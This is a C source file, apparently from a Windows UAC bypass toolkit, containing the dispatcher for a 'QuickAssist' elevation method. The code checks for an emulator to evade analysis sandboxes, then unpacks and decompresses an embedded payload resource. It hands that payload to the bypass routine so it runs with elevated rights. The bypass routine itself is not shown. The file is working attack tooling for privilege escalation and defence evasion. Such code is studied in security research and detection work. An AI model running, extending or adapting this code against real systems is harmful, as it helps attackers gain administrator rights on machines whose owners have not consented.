/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2025
*
*  TITLE:       METHODS.C
*
*  VERSION:     3.69
*
*  DATE:        07 Jul 2025
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodQuickAssist);

/*
* MethodsManagerCall
*
* Purpose:
*
* Run the QuickAssist method.
*
*/
NTSTATUS MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL        bParametersBlockSet = FALSE;
    NTSTATUS    MethodResult, Status;
    ULONG       PayloadSize = 0, DataSize = 0;
    PVOID       PayloadCode = NULL, Resource = NULL;
    PVOID       ImageBaseAddress = g_hInstance;

    UCM_PARAMS_BLOCK ParamsBlock;

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    // We are only implementing QuickAssist
    if (Method != UacMethodQuickAssist) {
        return STATUS_NOT_SUPPORTED;
    }

#ifndef _WIN64
    return STATUS_NOT_SUPPORTED;
#endif //_WIN64


    if (g_ctx->dwBuildNumber < NT_WIN10_REDSTONE5) {
        return STATUS_NOT_SUPPORTED;
    }

    Status = supLdrQueryResourceDataEx(
        FUBUKI_ID,
        ImageBaseAddress,
        &DataSize,
        &Resource);

    if (!NT_SUCCESS(Status)) {
        if (Status == STATUS_RESOURCE_TYPE_NOT_FOUND)
            return STATUS_INVALID_IMAGE_FORMAT;
        return Status;
    }

    if (DataSize == 0 || Resource == NULL) {
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    PayloadCode = g_ctx->DecompressRoutine(FUBUKI_ID, Resource, DataSize, &PayloadSize);

    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
        return STATUS_DATA_ERROR;
    }

    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;

    bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);

    MethodResult = MethodQuickAssist(&ParamsBlock);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        supVirtualFree(PayloadCode, NULL);
    }

    if (bParametersBlockSet) {
        Status = supWaitForGlobalCompletionEvent();
        ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
        supDestroySharedParametersBlock(g_ctx);
    }

    return MethodResult;
}

UCM_API(MethodQuickAssist)
{
#ifdef _WIN64
    return ucmQuickAssistMethod(
        Parameter->PayloadCode,
        Parameter->PayloadSize);
#else
    UNREFERENCED_PARAMETER(Parameter);
    return STATUS_NOT_SUPPORTED;
#endif
}
